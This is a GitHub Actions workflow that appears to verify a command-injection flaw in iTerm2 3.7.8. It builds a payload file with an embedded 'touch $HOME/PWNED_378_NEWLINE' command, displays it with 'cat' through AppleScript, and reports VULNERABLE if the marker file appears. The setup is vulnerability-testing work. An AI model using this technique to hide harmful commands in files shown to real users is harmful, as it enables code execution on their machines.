name: macos-verify

on:
  push:
    branches: [main]
    paths:
      - '.github/workflows/macos-verify.yml'
      - 'tools/**'
  workflow_dispatch:

jobs:
  control-378:
    runs-on: macos-latest
    timeout-minutes: 35
    env:
      ITERM_VER: "3_7_8"
      MODE: "newline"
      MARKER: "PWNED_378_NEWLINE"
    steps:
      - uses: actions/checkout@v4

      - name: Environment
        run: |
          sw_vers
          uname -m
          echo "console user: $(stat -f%Su /dev/console)"
          pgrep -l WindowServer || echo "NO WindowServer"

      - name: Download iTerm2
        run: |
          set -eux
          curl -L --max-time 600 -o /tmp/i.zip "https://iterm2.com/downloads/stable/iTerm2-${ITERM_VER}.zip"
          ls -la /tmp/i.zip
          mkdir -p /tmp/i
          unzip -q /tmp/i.zip -d /tmp/i
          xattr -dr com.apple.quarantine /tmp/i/iTerm.app || true
          /usr/libexec/PlistBuddy -c "Print :CFBundleShortVersionString" /tmp/i/iTerm.app/Contents/Info.plist

      - name: Build payload
        run: |
          set -eux
          python3 tools/make_payload.py --mode "$MODE" --cmd "touch \$HOME/$MARKER" --out /tmp/payload.md
          echo "--- od ---"
          od -c /tmp/payload.md | head -20

      - name: Clean
        run: rm -f "$HOME/$MARKER" /tmp/x

      - name: Launch iTerm2
        run: |
          open -a /tmp/i/iTerm.app
          sleep 15
          pgrep -l iTerm || echo "ITERM_NOT_RUNNING"

      - name: Drive cat
        run: |
          cat > /tmp/s1.scpt <<'SCPT'
          tell application "iTerm2"
            activate
            delay 2
            set w to (create window with default profile)
            delay 3
            tell current session of w
              write text "cat /tmp/payload.md"
            end tell
            delay 8
          end tell
          SCPT
          osascript /tmp/s1.scpt 2>&1 || echo "osascript failed"
          sleep 8
          echo "=== after cat ==="
          ls -la "$HOME/$MARKER" 2>/dev/null || echo "marker absent after cat"


      - name: Final
        if: always()
        run: |
          echo "=============== FINAL control-378 ==============="
          if [ -f "$HOME/$MARKER" ]; then
            echo "[RESULT] VULNERABLE"
            ls -la "$HOME/$MARKER"
          else
            echo "[RESULT] NOT_EXPLOITED"
          fi
          echo "--- home ---"
          ls -lat "$HOME" | head -15

      - name: Screenshot
        if: always()
        run: screencapture -x /tmp/shot.png 2>/dev/null || true

      - name: Upload
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: evidence-control-378
          path: |
            /tmp/payload.md
            /tmp/shot.png
          if-no-files-found: warn
